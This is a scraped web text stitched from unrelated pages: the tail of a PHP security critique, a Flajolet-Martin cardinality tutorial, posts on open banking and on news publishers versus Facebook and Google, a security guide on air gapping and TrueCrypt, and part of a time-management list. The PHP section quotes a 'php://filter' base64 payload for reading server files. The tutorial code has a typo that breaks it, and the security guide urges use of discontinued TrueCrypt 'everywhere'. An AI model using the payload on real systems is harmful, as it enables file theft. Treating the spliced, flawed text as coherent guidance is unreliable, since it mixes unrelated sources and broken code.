error, albeit that now that <code>__toString</code> <a href="https://wiki.php.net/rfc/tostring_exceptions">can <em>finally</em>
throw</a>, it might hopefully change
in the near future.</p>
<p>Albeit significant <a href="https://wiki.php.net/rfc/easy_userland_csprng">CSPRNG</a>
<a href="https://wiki.php.net/rfc/random-function-exceptions">improvements</a> have been
merged in PHP7, PHP8 didn't seize the opportunity to keep the momentum and to
aliases <code>rand</code> and <code>mt_rand</code> to <code>random_int</code>, like
<a href="https://snuffleupagus.readthedocs.io/features.html#weak-prng-via-rand-mt-rand">Snuffleupagus</a> is doing.</p>
<p>An other missed opportunity in my opinion is that there is <a href="https://bugs.php.net/bug.php?id=50715">still no
way</a> to disable some <a href="https://www.php.net/manual/en/wrappers.php">PHP's wrappers</a>, except via
<a href="https://www.php.net/manual/en/function.stream-wrapper-unregister.php"><code>stream_wrapper_unregister</code></a>
but this can be reversed with
<a href="https://www.php.net/manual/en/function.stream-wrapper-restore.php"><code>stream_wrapper_restore</code></a>.
Wrappers are scary: the main use I've seen for the <a href="https://www.php.net/manual/en/wrappers.php.php#wrappers.php.filter"><code>filter://</code>
one</a> is
exfiltrating data via <code>php://filter/convert.base64-encode/resource=/some/file</code>, and is a <a href="https://www.netsparker.com/blog/web-security/php-stream-wrappers/">decent
amount of</a>
<a href="https://lightless.me/archives/include-file-from-zip-or-phar.html">arcane</a>
<a href="https://gynvael.coldwind.pl/?lang=en&amp;id=671">stuff</a> lurking in the shadows.
Providing a way to reduce this attack surface (like making streams opt-in)
would be welcome.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Measuring the number of distinct elements from a stream of values is one of the most common utilities that finds its application in the field of Database Query Optimizations, Network Topology, Internet Routing, Big Data Analytics, and Data Mining.</p>
<p>A deterministic count-distinct algorithm either demands a large auxiliary space or takes some extra time for its computation. But what if, instead of finding the cardinality deterministically and accurately we just approximate, can we do better? This was addressed in one of the first algorithms in approximating count-distinct introduced in the seminal paper titled <a href="http://algo.inria.fr/flajolet/Publications/FlMa85.pdf">Probabilistic Counting Algorithms for Data Base Applications</a> by Philippe Flajolet and G. Nigel Martin in 1984.</p>
<p>In this essay, we dive deep into this algorithm and find how wittily it approximates the count-distinct by making a single pass on the stream of elements and using a fraction of auxiliary space.</p>

<p>The problem statement of determining count-distinct is very simple -</p>
<p><em>Given a stream of elements, output the total number of distinct elements as efficiently as possible.</em></p>
<p><img src="https://user-images.githubusercontent.com/4745789/101273043-250c3800-37b8-11eb-9e0c-435e386f3529.png" alt="https://user-images.githubusercontent.com/4745789/101273043-250c3800-37b8-11eb-9e0c-435e386f3529.png"></p>
<p>In the illustration above the stream has the following elements <code>4</code>, <code>1</code>, <code>7</code>, <code>4</code>, <code>2</code>, <code>7</code>, <code>6</code>, <code>5</code>, <code>3</code>, <code>2</code>, <code>4</code>, <code>7</code> and <code>1</code>. The stream has in all <code>7</code> unique elements and hence it is the count-distinct of this stream.</p>
<p>Deterministically computing count-distinct is an easy affair, we need a data structure to hold all the unique elements as we iterate the stream. Data structures like <a href="https://en.wikipedia.org/wiki/Set_(abstract_data_type)">Set</a> and <a href="https://en.wikipedia.org/wiki/Hash_table">Hash Table</a> suit this use-case particularly well. A simple pythonic implementation of this approach is as programmed below</p>
<pre><code><span><span>def</span> <span>cardinality</span><span>(elements: int)</span> -&gt; int:</span>
    <span>return</span> len(set(elements))
</code></pre>
<p>Above deterministic approach demands an auxiliary space of <code>O(n)</code> so as to accurately measure the cardinality. But when we are allowed to approximate the count we can do it with a fraction of auxiliary space using the Flajolet-Martin Algorithm.</p>

<p>The Flajolet-Martin algorithm uses the position of the rightmost set and unset bit to approximate the count-distinct in a given stream. The two seemingly unrelated concepts are intertwined using probability. It uses extra storage of order <code>O(log m)</code> where <code>m</code> is the number of unique elements in the stream and provides a practical estimate of the cardinalities.</p>
<h2>The intuition</h2>
<p>Given a good uniform distribution of numbers, the probability that the rightmost set bit is at position <code>0</code> is <code>1/2</code>, probability of rightmost set bit is at position <code>1</code> is <code>1/2 * 1/2 = 1/4</code>, at position <code>2</code> it is <code>1/8</code> and so on.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/101275842-e635ac80-37ce-11eb-9e00-357b966cbac6.png" alt="https://user-images.githubusercontent.com/4745789/101275842-e635ac80-37ce-11eb-9e00-357b966cbac6.png"></p>
<p>In general, we can say, the probability of the rightmost set bit, in binary presentation, to be at the position <code>k</code> in a uniform distribution of numbers is</p>
<p><img src="https://user-images.githubusercontent.com/4745789/101275886-357bdd00-37cf-11eb-9bc6-346332031eb2.png" alt="https://user-images.githubusercontent.com/4745789/101275886-357bdd00-37cf-11eb-9bc6-346332031eb2.png"></p>
<p>The probability of the rightmost set bit drops by a factor of <code>1/2</code> with every position from the Least Significant Bit to the Most Significant Bit.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/101276356-1cc0f680-37d2-11eb-858d-3f40061988f0.png" alt="https://user-images.githubusercontent.com/4745789/101276356-1cc0f680-37d2-11eb-858d-3f40061988f0.png"></p>
<p>So if we keep on recording the position of the rightmost set bit, <code>ρ</code>, for every element in the stream (assuming uniform distribution) we should expect <code>ρ = 0</code> to be <code>0.5</code>, <code>ρ = 1</code> to be <code>0.25</code>, and so on. This probability should become <code>0</code> when bit position, <code>b</code> is <code>b &gt; log m</code> while it should be non-zero when <code>b &lt;= log m</code> where <code>m</code> is the number of distinct elements in the stream.</p>
<p>Hence, if we find the rightmost unset bit position <code>b</code> such that the probability is <code>0</code>, we can say that the number of unique elements will approximately be <code>2 ^ b</code>. This forms the core intuition behind the Flajolet Martin algorithm.</p>
<h2>Ensuring uniform distribution</h2>
<p>The above intuition and approximation are based on the assumption that the distribution of the elements in the stream is uniform, which cannot always be true. The elements can be sparse and dense in patches. To ensure uniformity we hash the elements using a multiplicative hash function</p>
<p><img src="https://user-images.githubusercontent.com/4745789/98463097-f7df6080-21de-11eb-8b61-a84ff7ad85de.png" alt="https://user-images.githubusercontent.com/4745789/98463097-f7df6080-21de-11eb-8b61-a84ff7ad85de.png"></p>
<p>where <code>a</code> and <code>b</code> are odd numbers and <code>c</code> is the capping limit of the hash range. This hash function hashes the elements uniformly into a hash range of size <code>c</code>.</p>
<h2>The procedure</h2>
<p>The procedure of the Flajolet-Martin algorithm is as elegant as its intuition. We start with defining a closed hash range, big enough to hold the maximum number of unique values possible - something as big as <code>2 ^ 64</code>. Every element of the stream is passed through a hash function that permutes the elements in a uniform distribution.</p>
<p>For this hash value, we find the position of the rightmost set bit and mark the corresponding position in the bit vector as <code>1</code>, suggesting that we have seen the position. Once all the elements are processed, the bit vector will have <code>1</code>s at all the positions corresponding to the position of every rightmost set bit for all elements in the stream.</p>
<p>Now we find the position, <code>b</code>, of the rightmost <code>0</code> in this bit vector. This position <code>b</code> corresponds to the rightmost set bit that we have not seen while processing the elements. This corresponds to the probability <code>0</code> and hence as per the intuition will help in approximating the cardinality as <code>2 ^ b</code>.</p>
<pre><code>
L = <span>64</span>

<span><span>def</span> <span>hash_fn</span><span>(x: int)</span>:</span>
    <span>return</span> (<span>3</span> * x + <span>5</span>) % (<span>2</span> ** L)

<span><span>def</span> <span>cardinality_fm</span><span>(stream)</span> -&gt; int:</span>
    
    vector = <span>0</span>

    
    <span>for</span> x <span>in</span> skream:
        
        
        
        
        y = hash_fn(x)

        
        k = get_rightmost_set_bit(y)

        
        vector = set_bit(vector, k)

    
    
    b = rightmost_unset_bit(vector)

    
    <span>return</span> <span>2</span> ** b
</code></pre>
<p>Although the above algorithm does a decent job of approximating count-distinct it has a huge error margin, which can be fixed by averaging the approximations with multiple hash functions. The original Flajolet-Martin algorithm also suggests that the final approximation needs a correction by dividing the approximation by the factor <code>ϕ = 0.77351</code>.</p>
<p>The algorithm was <a href="https://github.com/arpitbbhayani/flajolet-martin/blob/master/flajolet-martin.ipynb">run</a> on a stream size of <code>1048</code> with a varying number of distinct elements and we get the following plot.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/101244923-58ef4b00-372f-11eb-9193-8e9d6dc6a227.png" alt="https://user-images.githubusercontent.com/4745789/101244923-58ef4b00-372f-11eb-9193-8e9d6dc6a227.png"></p>
<p>From the illustration above we see that the approximated count-distinct using the Flajolet-Martin algorithm is very close to the actual deterministic value.</p>
<p>A great feature of this algorithm is that the result of this approximation will be the same whether the elements appear a million times or just a few times, as we only consider the rightmost set bit across all elements and do not sample.</p>
<h3>Unique words in Thee Jungle Book</h3>
<p>The algorithm was run on the text dump of <a href="https://en.wikipedia.org/wiki/The_Jungle_Book">The Jungle Book</a> by Rudyard Kipling. The text was converted into a stream of tokens and it was found that the total number of unique tokens was <code>7150</code>. The approximation of the same using the Flajolet-Martin algorithm came out to be <code>7606</code> which in fact is pretty close to the actual number.</p>

December 6, 2020 | https://docs.prudent.me/blog/2020/12/5/open-digital | <a href="https://web.archive.org/web/*/https://docs.prudent.me/blog/2020/12/5/open-digital">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>This article on The Business Times is interesting:</p>
<p><a href="https://www.businesstimes.com.sg/banking-finance/open-banking-apis-a-bigger-threat-to-singapore-banks-than-digital-entrants-dbs">Open banking APIs a bigger threat to Singapore banks than digital entrants: DBS Research</a></p>
<p>While it focuses on the disruptive forces of open banking on traditional banks, I am more excited because it seems hopeful that Prudent users will finally be able to make Bank Account Enquiries (one of the three use cases on <a href="https://www.mas.gov.sg/development/fintech/technologies---apis">MAS' API page</a>)</p>
<p>Per the article: <i>"open banking may enable consumers to aggregate their banking, insurance and investment information across banks and financial institutions on a single platform"</i></p>
<p>This is exactly what Prudent need! Currently, Prudent extensions gets these information by means of texts and PDF imports, which is not exactly the best user experience, but it works...</p>
<p>If this upcoming 😉<i>digital service for financial planning</i>😜 will draw inspiration from PSD2, there should be an OBIE like API that allows secure access to the Account Information interface. To this end, there are three interesting aspects:</p>
<p><b>1) Registration with a National Competent Authority</b></p>
<p>Open banking initiatives typically requires 3rd party developers accessing customer data to be registered with a National Competent Authority. I hope this is done on a tiered basis, i.e. the criteria for read-only access to retail banking transaction data should not be prohibitive for citizen developers and individuals making available creative apps! I think it's reasonable considering the read-only nature and with user-consumer consent. Payment initiation and funds confirmation approval criteria can be higher.</p>
<p><b>2) Sandboxes</b></p>
<p>Sandboxes can be a double-edged sword. On one hand, it provides a comfortable environment for institutions, developers and user-consumers to figure out how and what things can be done. The flip side is when everyone gets too comfortable playing in the sandbox and do not move on.</p>
<p>Well, if the latter is the case, might as well have individual sandboxes where developers can access actual data of their accounts. In this case, perpetual sandboxes are totally fine! After all, programming is not an exclusive skill and tools can be made available for users to utilize these sandboxes without any coding (i.e. by re-using readily available code and clients).</p>
<p><b>3) Just JSON will do...</b></p>
<p>Lastly, if read-only APIs still seem a little daunting, the very least that can be done quickly is to provide transaction exports via e-mail in JSON instead of CSVs and PDFs. Sigh! I also wish trusted browser makers can make headless HTTP clients exclusively for API use, that will really spur the API economy! After all, from a security perspective, how different is it to browse these data vs programmatically using these data?</p>
<p>Selifishly, these are ideas on what helps Prudent and its users. Nevertheless, I hope it provides some glimpse into what a developer hopes for in open banking, however representative that may be. 🙏🏻</p>

                    <p>Yesterday, my cofounder wrote a <a href="https://blog.nillium.com/its-time-to-remove-news-from-facebook-and-google/">controversial post on this blog</a>, presenting a case for news publishers to limit -- or remove -- their reporting from Facebook and Google. &nbsp;The responses were immediate and plentiful, but fascinatingly different depending on the audience.</p><p>On Hacker News, a tech- and startup-focused forum, the link rose to the top of the list before being “flagged” and removed from the front page. &nbsp;The<a href="https://news.ycombinator.com/item?id=25249414"> comments there</a> took a more pragmatic, technical approach to the problem, from “<a href="https://news.ycombinator.com/item?id=25249553">The technical capability already exists in the form of robots.txt and the referer header,</a>” to constant reminders that news organizations <em>need</em> this traffic.</p><p>On the <a href="https://www.reddit.com/r/Journalism/comments/k3kmg9/its_time_to_remove_news_from_facebook_and_google/">r/journalism subreddit</a>, we were hit from the other side. &nbsp;Why not just “<a href="https://www.reddit.com/r/Journalism/comments/k3kmg9/its_time_to_remove_news_from_facebook_and_google/ge3zqq2/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">nationalize the press so we can quit with the hand-wringing</a>?” suggested one commenter, while another lamented that “<a href="https://www.reddit.com/r/Journalism/comments/k3kmg9/its_time_to_remove_news_from_facebook_and_google/ge51kko/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">this idea disenfranchises young journalists who don’t have any name credibility and recognition and need an established platforms [sic] gravitas to help establish them</a>.”</p><p>If ever there was a good illustration of the disconnect we face in trying to make journalism sustainable again, this is it. &nbsp;The tech side that constantly proclaims “information wants to be free,” and sees pay-for-journalism as a solved problem through Substack, and the jaded newsroom audience who sees another tech platform trying to come in and get them financially hooked.</p><p>The problem, of course, is that it is not a problem equally felt across these camps. &nbsp;The Hacker News crowd is absolutely correct when they say that news organizations need the traffic coming from social media and aggregators -- they do! -- but that is a sign of addiction, not a healthy ecosystem. &nbsp;And the journalist demographic has every reason to assume the worst, because they have been hurt before.</p><p>The economics of this are simple. &nbsp;</p><p>A few decades ago, people subscribed to newspapers, written on paper, that were delivered every morning. &nbsp;The subscription fee never fully covered the cost of running a newspaper; ads appeared between articles, and that subscription base guaranteed an audience for the sponsors. &nbsp;These publications naively started putting their articles online for free -- if advertising could buoy their business up until this point, why would the web be any different? &nbsp;As the ad market matured, CPMs increased, and slowly, internet advertising started to represent real money.</p><p>But then things went viral. &nbsp;Lots of things. &nbsp;People started sharing news articles they read (or <a href="https://www.washingtonpost.com/news/the-intersect/wp/2016/06/16/six-in-10-of-you-will-share-this-link-without-reading-it-according-to-a-new-and-depressing-study/%20Show%20less">didn’t read</a>) on social media. &nbsp;Tech companies tweaked their sorting algorithms to get content to eyeballs -- and did so incredibly successfully. But, this created our first problem.</p><h3 id="problem-1-hard-news-doesn-t-trend">Problem 1: Hard news doesn't trend</h3><p>Admittedly, this is only a problem depending on what side of the fence you sit.</p><p>If your goal -- like that of any number of tech companies -- is to get content in front of your users that they will engage with -- then this has been an unmitigated success. &nbsp;However, if you are reporting out a story for a specific audience, not being able to reach them is problematic. &nbsp;</p><p>At this point, the tech side may wonder why if your articles are so great, the audience isn’t seeking it out. &nbsp;The answer, I suspect, is that the audience does not know it is there.</p><p>Virtually any digital editor will tell you that most traffic bypasses the homepage. &nbsp;Users rarely think &nbsp;“I wonder what is happening today?” and seek out the news site; rather, they are told what is happening by the sorting algorithms and walk away feeling like they are updated. &nbsp;That works to a degree, except that hard news -- especially local news -- does not trend.</p><p>No one shares the summary of last night’s city council meeting. &nbsp;Even the most damning investigative report will only get so far if it is focused on a small area; users outside the area just won’t amplify it.</p><h3 id="problem-2-fake-news">Problem 2: Fake News</h3><p>What <em>does</em> trend? &nbsp;The outrageous, crazy things that you want to share with the world. &nbsp;Of course, that’s not to say all viral headlines are fake, but at this point it seems pretty well accepted that many are.</p><p>Because anyone can write and post anything, these wholly fabricated, or hyper-partisan stories are usually placed in the same regard as those that are rigorously reported and fact-checked. They are then forced to compete against each other for attention.</p><p>Worse yet, these posts can be so malignant that it impugns the reputation of “the media” -- because now you cannot believe what you read.<br></p><h3 id="problem-3-clickbait">Problem 3: Clickbait</h3><p>How do you compete then? &nbsp;By stooping lower. &nbsp;It means publishers resort to writing clickbait headlines to grab a second or two of user attention, and then covering the article page in more clickbait links to keep them there. &nbsp;</p><p>It can even creep into the editorial decisions: Knowing what people are searching for or clicking on can shape what reporters are assigned. <br></p><h3 id="problem-4-all-the-ads">Problem 4: All the ads</h3><p>Why do drivers in your area need to know about that new law? &nbsp;What celebrity finally “broke [their] silence?” &nbsp;I <em>know</em> I won’t believe what happens next. &nbsp;</p><p>These ads are annoying. These ads are detrimental to the user experience that any publication wants. &nbsp;But these ads are needed -- they are a symptom of the addiction. &nbsp;When the flow of users becomes constricted, these organizations have no other choice but to exploit their traffic for as much as it is worth; it’s survival.</p><p>Those ads in between articles in the print newspaper? &nbsp;They still exist, but they are now sold by Facebook, Twitter, and Google. &nbsp;Money is still being made off of the reader, it just is not going to the people doing the reporting. &nbsp;And partnerships between newsrooms and tech giants are generally for big, national outlets, leaving the local newsroom to suffer.</p><h3 id="problem-5-brain-drain">Problem 5: Brain drain</h3><p>As awful as this all is for the casual news consumer, it is worse for the people working on it all day everyday. &nbsp;No one wants assignment-by-SEO. No one wants the ads all over the place. And most of all, no one wants the layoffs. &nbsp;So those that can are fleeing to Substack, or creating their own publications.</p><p>That is great for them, and I wish them all the best. &nbsp;But as that Reddit commenter pointed out, that only works for reporters who have made a name for themselves. &nbsp;It is much more common to follow someone because you like their ideas than someone who you think reports out a story well. &nbsp;</p><p>What about all of those wide eyed, young, idealistic reporters <em>looking </em>to make a name for themselves? &nbsp;What about all of the important stories <em>they</em> are covering? &nbsp;Will now fewer people go to the legacy publications once the big names jump ship?<br></p><h3 id="what-we-re-doing">What we're doing</h3><p>This is why Xana wrote what she did, and made the case firms should pay up. &nbsp;First, it got your attention enough to rise above the noise (a requirement, as discussed above). And it also presented this point: The traffic coming from big tech, while needed for local news’ survival, is also killing it. The answer cannot be found in robots.txt -- it comes from rethinking the model of how we find our users, and how we interact with them.</p><p>Forth is our answer. &nbsp; </p><p>We want to take what is appealing about discovering news on social, and replicate it, but with reporters we know and trust. &nbsp;We want to help them build personal brands because we know younger generations tend to trust real people over companies or institutions (think: influencers). &nbsp;We want to rev-share, not because we think it is a selling point, but to align our incentives with those of the newsrooms; we both succeed together.</p><p>We will be launching soon in markets where we feel we have enough reporters to make using our app worthwhile. &nbsp;If you are a reporter or represent a newsroom, we would love to hear from you at <a href="mailto:hello@nillium.com">hello@nillium.com</a>. &nbsp;If you want to read what our partners are writing, please sign up for the <a href="https://www.forthapp.com/list.html">waiting list</a> -- we will let you know as soon as we are live in your area.</p>

				<p>Security is an illusion, especially with computers. The systems are so complex, handled by so many different people that nobody really has a good idea of how everything works. Even the best specialists have knowledge gaps: software, hardware, etc… This creates a security nightmare: breaking stuff is trivial, fixing the systems is nearly impossible.</p>
<h2 id="high-security-systems-still-exist">High Security Systems Still Exist</h2>
<p>There are systems that are protected against nearly all attacks. <strong>Their main philosophy is not to fix the security issues but to prevent an attacker from accessing the system in the first place.</strong> You can’t hack something that’s not there. However these systems are painful to use, especially for their lack of internet connection. Here are the main techniques used in a high security system:</p>
<ul>
<li>
<p><strong>Air Gapping</strong>: The device can’t connect to anything that is not physically plugged into it. No internet, wifi, bluetooth, speaker, microphone, webcam. Anything that can communicate with the outside world is physically removed from the electronic device.</p>
</li>

<p><strong>Non Contamination Protocol</strong>: Air Gapping is not sufficient (<a href="https://en.wikipedia.org/wiki/Stuxnet">stuxnet</a> is a good example of why it isn’t). Everything plugged into the air gapped device (like usb keys) can’t be plugged anywhere else. No exceptions. This prevents any information from getting out. I would even recommend not to plug anything that comes from another device (stuff like stuxnet or ransomware can still make some damage).</p>
</li>
<li>
<p><strong>Physical Protection</strong>: Non-contaminated air gapped devices are impossible to attack remotely. The only way is to access them physically. Having the electronic device hidden in a place that is difficult to access (e.g. in a safe) will protect it better.</p>
</li>
<li>
<p><strong>Full Disk Encryption</strong>: Physical Protection is not foolproof. An attacker can still get access to it with enough resources. To protect the information inside your device, encrypt its entire content. Not all types of encryption are made equal, we will talk about it later in this article.</p>
</li>
<li>
<p><strong>Tamper Evident System</strong>: The last remaining attack on an electronic device, after you’ve already used all of the above techniques, is to tamper it. The main goal is to access the encryption key when it is entered. Using tamper evident techniques (hardware and software) will alert you that somebody has modified your device to access your password (more about it in Two Layers of Encryption below).</p>
</li>
<li>
<p><strong>Backup</strong>: The last remaining problem is system failure. As long as your backups follow all of the above techniques, you can have as many as you want. Store them in a different location for increased safety.</p>
</li>
</ul>
<p><strong>Security is more about how you use the hardware/software rather than having a secure device in itself. It’s more about protocol than technology.</strong></p>
<p>I have seen classified environment with less security than the one just presented. Using a device with all of the above techniques will guarantee an electronic fortress. However this creates a big problem: <strong>you become the information’s weak link</strong>. It means that an attacker will no longer try to hack or decrypt your device, but instead will threaten you in order to access the information inside it.</p>
<h2 id="plausible-deniability">Plausible Deniability</h2>
<p><img src="https://www.alvarez.io/img/color/2FE.png" alt="Rubber-hose cryptanalysis">
<em><a href="https://en.wikipedia.org/wiki/Rubber-hose_cryptanalysis">Rubber-hose cryptanalysis</a> from <a href="https://xkcd.com/538/">xkcd</a></em></p>
<p>To prevent being compelled to reveal your passwords, somebody invented <a href="https://en.wikipedia.org/wiki/Deniable_encryption">Deniable Encryption</a>. Basically you have two passwords: when you enter the first one the information decrypted is different than when you enter the second one. You use your device with the second password to work on the sensitive information (which can’t be accessed using the first password). In case somebody threatens you, you give them the first password. They will decrypt your device and see that there is no information (or if there is, info that is not sensitive).</p>
<p>In practice Plausible Deniability is problematic:</p>
<ul>
<li>
<p>Tools and techniques exist to detect the presence of a secondary password (Deniable Encryption).</p>
</li>
<li>
<p>If your attacker sees that the system can use plausible deniability, they may not believe that there is only one password and therefore may continue to threaten you until you reveal the second one.</p>
</li>
<li>
<p>It will be harder for you to pass lie detection tests since you are still able to access the sensitive information using a secondary password.</p>
</li>
</ul>
<p>What you really want, if threatened, is not to be physically able to unlock your device. If you can’t decrypt the information, nobody has a reason to threaten you.</p>
<h2 id="two-factor-encryption">Two Factor Encryption</h2>
<p>Two Factor Encryption uses your password in addition to something you possess to generate the encryption key of your device. In general these secondary factors look like USB keys. To decrypt the information, you need your password (50% of the key) and some information you don’t know, stored/calculated by your secondary factor (the other 50% of the key).</p>
<p>You can’t open your device without these two elements: your password and the secondary factor.</p>
<p>The beautiful thing is that if you break the secondary factor, you won’t be able to access your device and its backups. You can’t be compelled to decrypt the information, because you simply can’t: your password, which you can now freely communicate to your attacker, will not be enough.</p>
<p><strong>Using Two Factor Encryption creates a physical “red button” which, if pressed, will destroy all access to the information in your devices (even offline backups stored in different locations).</strong></p>
<p>This also has the side effect of preventing you from accessing your device’s information ever again. This is one disadvantage of Two Factor Encryption over Plausible Deniability, which is that you can’t access your data after the attacker is done with you. However if you’re handling sensitive information, it is very likely that you’d rather have it destroyed than letting it fall into the wrong hands.</p>
<h2 id="yubikey">YubiKey</h2>
<p><img src="https://www.alvarez.io/img/color/2FE-2.png" alt="YubiKey"></p>
<p>A nice, affordable second factor for your encryption is a <a href="https://www.yubico.com/">YubiKey</a>. However there is no straightforward manual on how to use it, and the key has quite complex modes and functionalities.</p>
<p>If you are not a technical person, I will recommend using the <a href="https://support.yubico.com/hc/en-us/articles/360016614980-Understanding-Core-Static-Password-Features">password mode</a>. It is not as safe as the challenge mode, but it will be simpler to use and to configure.</p>
<p><strong>Password Mode</strong></p>
<p>The YubiKey can act as a usb keyboard. When the button is pressed, it will send a combination of keys (a kind of password) as if someone was typing. This makes it compatible with everything that requires a typed password. However using this mode implies that the 50% of the key coming from your 2FE will be the same across all devices. If it is intercepted it will drastically reduce the security.</p>
<p>To use the password mode, when prompted to your login information, enter your password (the thing you know), then plug your YubiKey and press the button. It will “type” the rest of the “password” (the thing you possess but don’t know). You can then access your device.</p>
<p>In this scenario the thing you know is 50% of the password, the other 50% of it (which you don’t know) is stored on your YubiKey and typed for you when you press the button.</p>
<p><strong>Challenge Mode</strong></p>
<p>The challenge mode is safer than the password mode, however it is more complex to configure and use. The information received from the YubiKey (the 50% of the key that comes from the 2FE) is different for each device. If it is intercepted, it will not compromise the security of other devices.</p>
<p>To use the challenge mode, your encryption software has to be compatible with it (contrary to the password mode which works with everything). When prompted to your login information, enter your password, and then the software will send a challenge (a phrase or an id you pre-configured) to the YubiKey which will respond with the missing 50% of the encryption key. The combination of the two elements (your password and the 2FE response), creating the encryption key, will unlock your device.</p>
<p>The advantage of the challenge mode is that if you configure a different challenge (phrase or id) for each device you will have a different response each time, making your encryption key unique on all your devices and backups. This increases the security a lot in case one of them is compromised.</p>
<h2 id="not-all-encryptions-are-made-equal">Not All Encryptions Are Made Equal</h2>
<p>Cryptography may be the hardest thing in security. If you screw it up, nobody will come and tell you about it, and  you will pay the consequences later on.</p>
<p><strong>Serpent Encryption Algorithm</strong></p>
<p><a href="https://en.wikipedia.org/wiki/Serpent_(cipher)">Serpent</a> was part of the finalists of the <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard_process">AES competition</a>. It was judged to be the most secure algorithm of them all, but <a href="https://www.schneier.com/wp-content/uploads/2016/02/paper-twofish-final.pdf">was discarded due to its speed</a>. However 20 years later, the computational power of everything exploded. Today the difference in speed between AES and Serpent doesn’t matter anymore, however the  difference in security still does. This is part of the reason why you should use Serpent everywhere ;)</p>
<p><strong>Truecrypt</strong></p>
<p>Truecrypt is an awesome tool that has been proved to be <a href="https://en.wikipedia.org/wiki/TrueCrypt#Legal_cases">complicated to break</a>. The tool was suddenly discontinued in 2014 in what seemed to be due to <a href="https://www.reddit.com/r/sysadmin/comments/26pxol/truecrypt_is_dead/">third party pressure</a>. An independent audit was financed by the <a href="https://www.opencryptoaudit.org/">community</a> in 2013. The <a href="https://opencryptoaudit.org/reports/TrueCrypt_Phase_II_NCC_OCAP_final.pdf">summary</a> was released in 2015, showing “no evidence of deliberate backdoors, or any severe design flaws that will make the software insecure in most instances”.</p>
<p>Given that it’s complicated/impossible to break, that it’s been audited without any security flaw found, and the pressure put on the developers to stop the project: <strong>it’s safe to say that you should use it everywhere</strong>.</p>
<p>You can find Truecrypt <a href="https://github.com/DrWhax/truecrypt-archive">here</a>, the last version is 7.1a. Use the 3 ciphers cascade encryption mode.</p>
<p>If you use the hidden volume feature, be careful with older backup versions of your file container. The difference between the older version of the container and the newer version will reveal the use of an hidden volume (bytes will change where there is supposedly no data). Try to backup the content of your container inside a new one, so  that there is no match at all between the backups and the original container.</p>
<p><strong>Password</strong></p>
<p>The last line of defense for your data is your password. Depending on the system you are using, the encryption key will be encrypted using your password, or …</p></div></div>

<h2>A Compendium of 58 Effective Strategies, Techniques and Methods</h2>
<p><img src="https://www.focalityapp.com/assets/img/mood/glenn-carstens-peters-RLw-UC03Gwc-unsplash.1920.jpg" alt="Time Management Strategies"></p>
<p>Managing your own time is an essential skill in today’s fast-paced world. It's also more challenging than ever. Fortunately, there are many <strong>time management strategies that can help you become organized and efficient</strong>. Use this overview of 58 strategies and techniques to find the ones that work best for you.</p>
<!-- It’s hard to keep track of all the time management strategies out there. Productivity gurus tend to create their own, building on the massive fundus of existing strategies. So to get you ready for the next time someone mentions their favorite but obscure time management technique, here is an exhaustive overview of more than 50 strategies. -->
<h2>Deep Planning</h2>
<!-- <img src="/assets/img/funktionsgrafik-play-store-2019-10-18.jpg" alt="Plan, Reflect, Improve"/> -->
<!-- <img src="/assets/img/values-finder-banner.jpg" alt="Plan, Reflect, Improve" style="max-width: 100%"/> -->
<p><a href="https://www.focalityapp.com/en/time-management-app/"><img src="https://www.focalityapp.com/assets/img/plan-reflect-improve-banner.jpg" alt="Time Management App"></a></p>
<!-- Did we just complain about everybody creating their own time management strategy? Well, obviously it’s all right if we do it, isn’t it? :) -->
<p>Most plans are strictly sequential. When you invariably have to adjust your plan to reality, you have to update the whole lengthy sequence. Time-consuming at best, motivation consuming at worst. With deep planning, you create a simple hierarchy instead.</p>
<p>Think about what you want to achieve this year. Based on that, what do you want to achieve this month? This week? Today? This way you create a long-term strategy and still adjust your plans with little effort.</p>
<!-- At the end of each period, take a step back and reflect. What went well? What not? What can I do differently next time? -->
<p>Curious? Then take a look at <a href="https://www.focalityapp.com/en/time-management-app/">Focality, our time management app</a>. Focality combines deep planning, self-reflection and data-driven insights to let you constantly improve your time management skills.</p>
<h2>The complete list of time management strategies</h2>
<p>Without further ado, here comes the complete list of time management techniques in alphabetic order:</p>
<h3>1-3-5 rule</h3>
<p>For every day, create a list of one big thing, three medium things and five small things that you want to accomplish this day. This brings clarity into your workday and helps not to get buried by an endless flood of to-do items.</p>
<h3>2-Hour Solution</h3>
<p>See Two-Hour Solution.</p>
<h3>2-Minute Rule</h3>
<p>There are two 2-Minute Rules:</p>
<ol>
<li>
<p>If you want to establish a new habit, make sure that it requires no more than 2 minutes in the beginning. Work yourself up from there.</p>
</li>
<li>
<p>In the Getting Things Done methodology (see below), if a task takes only 2 minutes or less, then do it right away instead of organizing it.</p>
</li>
</ol>
<h3>10-Minute Rule</h3>
<p>If you are putting something off, force yourself to do it for just 10 minutes. Chances are that you will continue past the 10 minutes.</p>
<h3>18 Minutes</h3>
<p>Start your day by planning what you will do that day for 5 minutes. Every hour, take one minute, review your progress and refocus. At the end of the day, take 5 minutes to reflect and evaluate your day.</p>
<h3>4Ds of Time Management</h3>
<p>This method helps you to quickly decide what to do with a task. Either Do it, Defer it, Delegate it or Drop it.</p>
<h3>7 Minute Life</h3>
<p>Spend 7 minutes in the morning to plan your day. Then another 7 minutes in the evening to reflect. Accompanied by many <a href="https://the7minutelife.com/member-tools/">templates</a>.</p>
<h3>80/20 Rule</h3>
<p>The 80/20 rule, also known as the Pareto Principle, is a rule of thumb that states that 80% of the effect step from 20% of the causes. Applied to time management it means that you can get 80% of the results with just 20% of the work. Getting to 100% will require disproportionately more work. Perfect is the enemy of done.</p>
<h3>90-Minute Rule / 90-Minute Focus Sessions / 90-Minute Solution</h3>
<p>Align your work with your <a href="https://en.wikipedia.org/wiki/Basic_rest%E2%80%93activity_cycle">basic rest–activity cycle</a> by doing focused work for approximately 90 minutes, followed by a 20-minute break. The following article sums it up nicely: <a href="https://medium.com/better-humans/avoid-burnout-and-increase-awareness-using-ultradian-rhythms-5e64158e7e19">Avoid Burnout and Increase Awareness Using Ultradian Rhythms</a></p>
<h3>ABCDE Method</h3>
